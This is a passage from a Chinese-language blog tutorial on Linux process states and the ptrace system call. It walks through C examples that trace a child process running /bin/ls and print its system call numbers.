data)<br>描述：设置浮点寄存器值，pid表示被跟踪的子进程，data为用户数据地址。此功能将设置所有浮点协处理器387的所有寄存器的值。</p><h3 id="1-6-3-进程状态值中止状态"><a href="#1-6-3-进程状态值中止状态" class="headerlink" title="1.6.3 进程状态值中止状态"></a>1.6.3 进程状态值中止状态</h3><p>在Linux系统中，进程常见的状态有下面这些</p><p>S：Interruptible Sleeping，即可中断睡眠；</p><p>D：Uninterruptible Sleeping，即不可中断睡眠；</p><p>R：Running or Runnable，即运行状态；</p><p>Z：Zombie，即僵尸状态</p><p>T：Stopped or Traced，即中止状态（注意是中止不是终止）</p><p>这里，我们关注点放在<code>T：Stopped or Traced</code>这个类型上。因为<code>Traced</code>类型是由<code>ptrace</code>系统调用提供的一个进程状态。实际上，在某些Linux发行版中，这个类型的进程状态标识符是<code>t</code>而非<code>T</code>。</p><hr><h4 id="1-6-3-1-Stopped状态"><a href="#1-6-3-1-Stopped状态" class="headerlink" title="1.6.3.1 Stopped状态"></a>1.6.3.1 Stopped状态</h4><p>如何能够让一个进程进入到“中止状态”呢？</p><p>我们可以通过ctrl+z来中止当前输入程序的运行，然后可以查看进程状态</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725521534710-ecc3e4f3-3a59-455a-8518-4ee9832628ef.png" alt="img"></p><p>之后再使用fg就可以恢复进程状态</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725521563404-2340e616-ddce-4047-b31e-be1016202d38.png" alt="img"></p><hr><h4 id="1-6-3-2-Traced状态——新手例子"><a href="#1-6-3-2-Traced状态——新手例子" class="headerlink" title="1.6.3.2 Traced状态——新手例子"></a>1.6.3.2 Traced状态——新手例子</h4><p>通过<code>ptrace</code>系统调用可以让一个进程进入<code>Traced</code>状态。</p><ul><li><p><code>tracee</code>进程调用<code>ptrace</code>系统调用，并在<code>request</code>参数处传递<code>PTRACE_TRACEME</code>这个值，表示想要被<code>tracer</code>进程追踪。通过这种方式的进程想要进入<code>Traced</code>状态有两种方式：</p></li><li><ul><li>主动调用<code>exec</code>系列的系统调用；</li><li><code>tracer</code>发送进入<code>Traced</code>状态的相关信号。</li></ul></li><li><p><code>tracer</code>进程调用<code>ptrace</code>系统调用，并在<code>request</code>参数处传递<code>PTRACE_ATTACH</code>这个值，并给出<code>tracee</code>进程的<code>pid</code>，从而让<code>tracee</code>进程进入<code>Traced</code>状态。</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line"><span class="type">pid_t</span> child;</span><br><span class="line"><span class="type">long</span> orig_rax;</span><br><span class="line">child=fork();</span><br><span class="line"><span class="keyword">if</span>(child==<span class="number">0</span>)&#123;<span class="comment">//表示这是子进程，子进程fork返回0</span></span><br><span class="line">    <span class="comment">//当前进程会在每次执行系统调用之前暂停，并允许其父进程通过 ptrace 调用来检查和修改它的寄存器、内存等状态，或者继续它的执行。</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;start move!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">ptrace</span>(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);<span class="comment">//0表示当前进程，参数规定是父进程跟踪</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;keep moving???&quot;</span>);</span><br><span class="line">        <span class="built_in">execl</span>(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,<span class="literal">NULL</span>);<span class="comment">//这里进程被替换了？</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;/bin/ls ok?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="comment">//父进程，wait函数会等待子进程执行完再执行父进程</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;father step1&quot;</span>);</span><br><span class="line">        <span class="built_in">wait</span>(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;father step2&quot;</span>);</span><br><span class="line">        orig_rax=<span class="built_in">ptrace</span>(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child process called a system call, id is %ld\n&quot;</span>,orig_rax);</span><br><span class="line">        <span class="built_in">ptrace</span>(PTRACE_CONT,child,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下所示</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725523442460-5ab430b5-a6d0-4ab7-8010-b0217c4f5162.png" alt="img"></p><p>首先fork出来的进程和父进程是不分前后顺序的（前面说到顺序由高度函数决定），所以先父进程进入到else分支，子进程接着进入if分支，然后父进程执行了wait函数之后，交给子进程执行，执行到ptrace(PTRACE_TRACEME,0,NULL,NULL)，但是此时子进程并没有进入traced状态，直到执行到exec类型的函数（才会发出相关信号），才会让子进程也被父函数跟踪。回到父函数，父函数调用了ptrace(PTRACE_PEEKUSER,child,8*ORIG_RAX,NULL)获取子进程RAX的值，59即是execve的系统调用号。之后调用ptrace(PTRACE_CONT,child,NULL,NULL);，让子进程继续执行，也就有了下面的&#x2F;bin&#x2F;ls输出的内容。</p><hr><h5 id="1-6-3-2-1-可能有的一些问题"><a href="#1-6-3-2-1-可能有的一些问题" class="headerlink" title="1.6.3.2.1 可能有的一些问题"></a>1.6.3.2.1 可能有的一些问题</h5><p>问题1：父进程怎么向子进程发送信号？</p><p>问题2：execl系统调用给父进程发送SIGTRAP信号后，父进程怎么样处理这个信号？</p><ul><li><p>首先回答问题2:</p></li><li><ul><li><code>wait</code>系统调用是一个用来进行进程控制的系统调用，它可以用来阻塞父进程，当父进程接收到子进程传来信号或者子进程退出时，父进程才会继续运行。所以这里的<code>wait</code>系统调用很显然用来接收子进程调用<code>execl</code>时产生的<code>SIGTRAP</code>信号。</li></ul></li><li><p>然后是问题1：</p></li><li><ul><li><code>ptrace(PTRACE_CONT, child, NULL, NULL)</code>表达式：</li><li>父进程这里通过调用<code>ptrace</code>系统调用并使用<code>PTRACE_CONT</code>作为操作类型，这个操作类型的作用官方是这样描述的：<strong>恢复处于</strong><code>**Traced**</code><strong>状态的</strong><code>**tracee**</code><strong>进程。最后一个参数表示发送给</strong><code>**tracee**</code><strong>进程的信号。</strong></li></ul></li></ul><hr><h5 id="1-6-3-2-2-USER字段"><a href="#1-6-3-2-2-USER字段" class="headerlink" title="1.6.3.2.2 USER字段"></a>1.6.3.2.2 USER字段</h5><p>其实我们RAX的宏是这样的，那这个15是什么意思呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define ORIG_RAX <span class="number">15</span></span><br></pre></td></tr></table></figure><p>此时就要结合user字段的结构体来看了，<code>USER</code>字段的部分代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">user_regs_struct</span></span><br><span class="line">&#123;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r15;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r14;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r13;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r12;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbp;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r11;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r10;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r9;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r8;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rax;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rcx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsi;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdi;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> orig_rax;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rip;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> cs;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> eflags;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsp;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ss;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs_base;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs_base;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ds;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> es;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">user</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">user_regs_struct</span>   regs;</span><br><span class="line">  <span class="comment">// other fields</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user结构体第一个字段就是所有寄存器的信息struct user_regs_struct   regs;</p><p>这个结构体里面都是unsigned long long int类型的成员。我们再结合ptrace系统调用看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orig_rax = ptrace(PTRACE_PEEKUSER, child, <span class="number">8</span> * ORIG_RAX, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p><code>addr</code>字段我们传的是<code>8 * ORIG_RAX</code>，其中<code>8</code>代表每个成员的大小（long long int在64位系统中所占用的大小），而<code>ORIG_RAX(15)</code>刚好对应在<code>user_regs_struct</code>字段中的<code>orig_rax</code>成员。</p><p>这个成员在执行完execve系统调用后，存着的就是系统调用号。</p><hr><h4 id="1-6-3-3-Traced状态——入门例子"><a href="#1-6-3-3-Traced状态——入门例子" class="headerlink" title="1.6.3.3 Traced状态——入门例子"></a>1.6.3.3 Traced状态——入门例子</h4><p>在上面的版本的demo中，我们已经能够理解父子进程中使用ptrace能做到的一些事情了。我们在上面的demo跟着参考文章进行一些改进。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">pid_t</span> child;</span><br><span class="line"><span class="type">long</span> orig_rax;</span><br><span class="line">child=fork();</span><br><span class="line">    <span class="type">int</span> status=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">        execl(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Origen signal %d !Got signal %d\n&quot;</span>,status,WSTOPSIG(status));</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status)) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            orig_rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Program called system call: %ld\n&quot;</span>, orig_rax);</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关宏的设置是这样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIFEXITED(status)    (((status) &amp; 0xff) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFSTOPPED(status)   (((status) &amp; 0xff) == 0x7f)</span></span><br></pre></td></tr></table></figure><p>这里涉及到的新东西有以下几个。</p><ol><li>wait(&amp;status);</li><li>ptrace(PTRACE_SYSCALL, child, NULL, NULL);</li><li>父进程的调用是在一个死循环里</li></ol><p>运行结果如下所示</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725531833655-06cbd253-9b05-4082-a266-3f368db9af93.png" alt="img"></p><hr><h5 id="1-6-3-3-1-wait-status-以及相关宏"><a href="#1-6-3-3-1-wait-status-以及相关宏" class="headerlink" title="1.6.3.3.1 wait(&amp;status)以及相关宏"></a>1.6.3.3.1 wait(&amp;status)以及相关宏</h5><p>上面讲wait函数的时候提到过，这时候会关心子进程返回的信号类型，也就是说会接收子进程来的信号。</p><p>接收到信号之后，WSTOPSIG宏可以获取信号对应的编号，具体编号可以用kill -l指令展现出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">qwq@qwq:~/ctf$ kill -l</span><br><span class="line"> <span class="number">1</span>) SIGHUP <span class="number">2</span>) SIGINT <span class="number">3</span>) SIGQUIT <span class="number">4</span>) SIGILL <span class="number">5</span>) SIGTRAP</span><br><span class="line"> <span class="number">6</span>) SIGABRT <span class="number">7</span>) SIGBUS <span class="number">8</span>) SIGFPE <span class="number">9</span>) SIGKILL<span class="number">10</span>) SIGUSR1</span><br><span class="line"><span class="number">11</span>) SIGSEGV<span class="number">12</span>) SIGUSR2<span class="number">13</span>) SIGPIPE<span class="number">14</span>) SIGALRM<span class="number">15</span>) SIGTERM</span><br><span class="line"><span class="number">16</span>) SIGSTKFLT<span class="number">17</span>) SIGCHLD<span class="number">18</span>) SIGCONT<span class="number">19</span>) SIGSTOP<span class="number">20</span>) SIGTSTP</span><br><span class="line"><span class="number">21</span>) SIGTTIN<span class="number">22</span>) SIGTTOU<span class="number">23</span>) SIGURG<span class="number">24</span>) SIGXCPU<span class="number">25</span>) SIGXFSZ</span><br><span class="line"><span class="number">26</span>) SIGVTALRM<span class="number">27</span>) SIGPROF<span class="number">28</span>) SIGWINCH<span class="number">29</span>) SIGIO<span class="number">30</span>) SIGPWR</span><br><span class="line"><span class="number">31</span>) SIGSYS<span class="number">34</span>) SIGRTMIN<span class="number">35</span>) SIGRTMIN+<span class="number">1</span><span class="number">36</span>) SIGRTMIN+<span class="number">2</span><span class="number">37</span>) SIGRTMIN+<span class="number">3</span></span><br><span class="line"><span class="number">38</span>) SIGRTMIN+<span class="number">4</span><span class="number">39</span>) SIGRTMIN+<span class="number">5</span><span class="number">40</span>) SIGRTMIN+<span class="number">6</span><span class="number">41</span>) SIGRTMIN+<span class="number">7</span><span class="number">42</span>) SIGRTMIN+<span class="number">8</span></span><br><span class="line"><span class="number">43</span>) SIGRTMIN+<span class="number">9</span><span class="number">44</span>) SIGRTMIN+<span class="number">10</span><span class="number">45</span>) SIGRTMIN+<span class="number">11</span><span class="number">46</span>) SIGRTMIN+<span class="number">12</span><span class="number">47</span>) SIGRTMIN+<span class="number">13</span></span><br><span class="line"><span class="number">48</span>) SIGRTMIN+<span class="number">14</span><span class="number">49</span>) SIGRTMIN+<span class="number">15</span><span class="number">50</span>) SIGRTMAX<span class="number">-14</span><span class="number">51</span>) SIGRTMAX<span class="number">-13</span><span class="number">52</span>) SIGRTMAX<span class="number">-12</span></span><br><span class="line"><span class="number">53</span>) SIGRTMAX<span class="number">-11</span><span class="number">54</span>) SIGRTMAX<span class="number">-10</span><span class="number">55</span>) SIGRTMAX<span class="number">-9</span><span class="number">56</span>) SIGRTMAX<span class="number">-8</span><span class="number">57</span>) SIGRTMAX<span class="number">-7</span></span><br><span class="line"><span class="number">58</span>) SIGRTMAX<span class="number">-6</span><span class="number">59</span>) SIGRTMAX<span class="number">-5</span><span class="number">60</span>) SIGRTMAX<span class="number">-4</span><span class="number">61</span>) SIGRTMAX<span class="number">-3</span><span class="number">62</span>) SIGRTMAX<span class="number">-2</span></span><br><span class="line"><span class="number">63</span>) SIGRTMAX<span class="number">-1</span><span class="number">64</span>) SIGRTMAX</span><br></pre></td></tr></table></figure><p>WIFEXITED宏可以检测接收到的型号是否标志着子进程退出，其宏定义为。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># in sys/wait.h</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> WIFEXITED(status)  __WIFEXITED (__WAIT_INT (status))</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># in bits/waitstatus.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __WIFEXITED(status) (__WTERMSIG(status) == 0)</span></span><br></pre></td></tr></table></figure><p>也就是说，如果接收到的信号编号为<code>0</code>，就意味着子进程退出。</p><hr><p>子进程什么时候会向父进程发送信号？</p><p>目前情况是syscall的时候会向父进程发一次</p><hr><h5 id="1-6-3-3-2-PTRACE-SYSCALL与while循环"><a href="#1-6-3-3-2-PTRACE-SYSCALL与while循环" class="headerlink" title="1.6.3.3.2 PTRACE_SYSCALL与while循环"></a>1.6.3.3.2 PTRACE_SYSCALL与while循环</h5><p>照搬上面的解释</p><p>形式：ptrace(PTRACE_SYS, pid, 0, signal)<br>描述：继续执行。pid表示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。<strong>与PTRACE_CONT不同的是进行系统调用跟踪</strong>。在被跟踪进程继续运行直到调用系统调用开始或结束时，被跟踪进程被中止，并通知父进程。</p><p>PTRACE_SYSCALL与PTRACE_CONT有如下的关系</p><p>与<code>PTRACE_CONT</code>功能类似，使子进程继续执行，其最后一个参数也和<code>PTRACE_CONT</code>一样，表示是否发送相应信号给子进程。</p><p>发生systemcall相关的事件（包括systemcall开始和systemcall结束）时子进程需要通知父进程。<strong>要注意的是每次子进程被暂停后都需要重新调用PTRACE_SYSCALL以便下一次的system call事件会被捕抓到。</strong></p><p>根据<code>PTRACE_SYSCALL</code>的功能描述，我们通过一个<code>while</code>循环体来接收子进程每一次<code>system call</code>发出的信号，并在处理完成后再次通过<code>PTRACE_SYSCALL</code>来捕获下一次<code>system call</code>的信号，并当子进程退出时结束循环。</p><hr><h5 id="1-6-3-3-3-运行结果解析"><a href="#1-6-3-3-3-运行结果解析" class="headerlink" title="1.6.3.3.3 运行结果解析"></a>1.6.3.3.3 运行结果解析</h5><p>运行结果打印出来的都是三个东西</p><p>Origen signal 1407 !Got signal 5</p><p>Program called system call: 59</p><p>其中上面的1407和5也就是signal信号都是全部一致的</p><p>一开始就出现了59号的系统调用，这是因为调用了execve</p><p>之后则是12&#x2F;158&#x2F;9&#x2F;21&#x2F;257&#x2F;3&#x2F;0&#x2F;262&#x2F;10&#x2F;17&#x2F;218&#x2F;137&#x2F;318&#x2F;202&#x2F;191&#x2F;41……</p><p>除了一开始的59，<strong>其他的系统调用都是重复出现的。这是因为PTRACE_SYSCALL会让子进程在每次系统调用进入和退出的时候都发出信号。</strong></p><p>父进程<code>wait</code>系统调用每次接收到的信号都是<code>5）SIGTRAP</code>。</p><hr><h4 id="1-6-3-4-Traced状态——进阶例子"><a href="#1-6-3-4-Traced状态——进阶例子" class="headerlink" title="1.6.3.4 Traced状态——进阶例子"></a>1.6.3.4 Traced状态——进阶例子</h4><h5 id="1-6-3-4-1-过滤execve的框架"><a href="#1-6-3-4-1-过滤execve的框架" class="headerlink" title="1.6.3.4.1 过滤execve的框架"></a>1.6.3.4.1 过滤execve的框架</h5><p>往往tracee进程都会通过ptrace+execve的方式将自身转变为一个处于中止状态的进程，而tracer进程往往会通过wait系统调用来接收由tracee进程发出的SIGTRAP信号。因此在这种场景下，第一个信号一定是对应execve这个系统调用的，而并不是我们想要追踪的进程的系统调用，因此我们忽略这个信号。</p><p>所以下面的代码有一个空的死循环，我们还没写进去code，我们先在死循环接受第一个信号execve</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">  <span class="type">pid_t</span> child = fork();</span><br><span class="line">  <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line">  <span class="type">long</span> orig_rax = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (child == <span class="number">0</span>)&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    execl(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="comment">// code block</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着是ptrace的系统调用，通过PTRACE_SYSCALL选项通知tracee进程的所有系统调用的信号给父进程然后再进入循环体。前面我们提到过tracee进程发送的有关系统调用的信号是成对出现的。其中有一个系统调用号1，也就是sys-write值得我们关注。我们可以看到write系统调用是打印出ls的结果的关键。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Origen signal <span class="number">1407</span> !Got signal <span class="number">5</span></span><br><span class="line">Program called system call: <span class="number">1</span></span><br><span class="line">-rwx--x--x  <span class="number">1</span> qwq qwq  17K  <span class="number">7</span>月 <span class="number">18</span> <span 